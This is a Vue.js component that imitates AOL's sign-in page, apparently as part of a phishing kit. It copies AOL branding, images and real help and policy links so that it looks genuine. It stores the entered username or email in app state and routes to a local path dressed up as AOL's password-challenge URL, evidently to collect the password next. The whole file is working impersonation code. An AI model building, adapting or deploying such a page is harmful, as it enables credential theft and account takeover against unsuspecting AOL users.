<template>
    <div>
         <v-toolbar color="white" flat style="padding: 0px 50px;">
      <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="" height='35px'>
      <v-spacer></v-spacer>
      <v-toolbar-items>
        <v-btn text dark>Help</v-btn>
      </v-toolbar-items>
    </v-toolbar>
     <div class="content">
     <v-row no-gutters>
      <v-col cols="12" sm="12" md="7">
        <div class="text-card hidden-sm-and-down">
          
        </div>
      </v-col>
       <v-col cols="12" sm="12" md="5">
        <v-card class="login-card">
            <center>
                <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="" height='30px'>
            <br>
            <br>
             <p style="font-size:20px;">Sign in</p>
            <v-text-field
            v-model = "Cemail"
            label="Username or Email"
            single-line
          ></v-text-field>
          <br>
          <v-btn  @click="toPass" depressed style="border-radius:1px;" large block color="blue" dark>Next</v-btn>
            </center>
            <br>
           <p style="font-size:13px"><a href="https://login.aol.com/account/challenge/username?intl=us&lang=en-us&src=fp-us&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Frequest_auth%3Fstate%3DWyIwQS1QWkZYSk5XNGNIcnhuTk5uU2lMdDJMa2p5bWtjWTJXb01fSk9vbmFJIix7InJlZGlyZWN0X3VyaSI6Imh0dHBzOlwvXC93d3cuYW9sLmNvbSIsImFsbG93ZWRfcXVlcnlfcGFyYW1zIjp7ImludGwiOiJ1cyIsImxhbmciOiJlbi11cyIsInNyYyI6ImZwLXVzIn0sImp0aSI6IkFyb29mRXNubnpJcWNsY2ljNGhlUkU5dWFLQUM5ald5In0sMTU3NTIzMzM4MiwiWmlHVnFfOU5rV1J0NW9hZGxSVVJoTVlzeXZZZXNvME9ST2dlZFBKRXFEOCJd%26nonce%3DAroofEsnnzIqclcic4heRE9uaKAC9jWy%26response_type%3Dcode%26approval_prompt%3Dauto%26client_id%3Ddj0yJmk9N3dWZW1TTWNhY0o0JmQ9WVdrOWMxbDVlVEo2TmpRbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1lMA--%26redirect_uri%3Dhttps%253A%252F%252Fwww.aol.com%252Fcallback%26intl%3Dus%26lang%3Den-us%26src%3Dfp-us&authMechanism=secondary&sessionIndex=Qg--">Trouble signing in?</a></p>
        <br>
        <v-btn @click="Create" outlined depressed style="border-radius:1px;" large block color="blue" dark>Create Account</v-btn>
        </v-card>
      </v-col>
    </v-row>
     </div>
     <div class="login-footer">
      <a href="https://policies.oath.com/us/en/oath/terms/otos/index.html">Terms |</a>
       <a href="https://policies.oath.com/us/en/oath/privacy/index.html"> Privacy</a>
     </div>
   </div>
</template>


<script>
 import { mapGetters } from 'vuex'
  export default {
      data() {
    return {
      Cemail: ''
    }
  },
  

  methods:{
    toPass(){
       this.$store.commit('addEmail', this.Cemail) 
      this.$router.push("/account/challenge/password-authMechanism-primary-display-login-done-www.aol.com")
    },
    Create(){
      window.location.assign("https://login.aol.com/")
    }
  }
}
</script>

<style scoped>
.login-footer {
    text-align: center;
    padding: 6px 0;
    font-size: .58824em;
    position: fixed;
    bottom: 0;
    background: #fff;
    color: #26282a;
    z-index: 1;
    width: 100%;
}
.login-card {padding:30px 30px 100px 30px;}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { 
    padding: 50px 180px;
    background-image: url('https://s.yimg.com/cv/ae/default/160912/Field_Evergreen_PlayNow_1440x1024.jpg');
  background-size: cover;
    }

    
  @media (max-width: 991px) { 
.login-footer {
    text-align: center;
    padding: 6px 0;
    font-size: .58824em;
    position: fixed;
    bottom: 0;
    background: #fff;
    color: #26282a;
    z-index: 1;
    width: 100%;
}
.login-card {padding:30px 30px 100px 30px;}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { padding: 20px 180px;}

  }

 @media (max-width: 767px) {   

}

    @media (max-width: 479px) {
.login-footer {
    text-align: center;
    padding: 6px 0;
    font-size: .58824em;
    position: fixed;
    bottom: 0;
    background: #fff;
    color: #26282a;
    z-index: 1;
    width: 100%;
}
.login-card {padding:30px 20px 30px 20px;}
.text-card {padding: 80px 20px 0px 20px; font-size:22px; letter-spacing: 1px;}
.content { padding: 50px 20px;}
}
</style>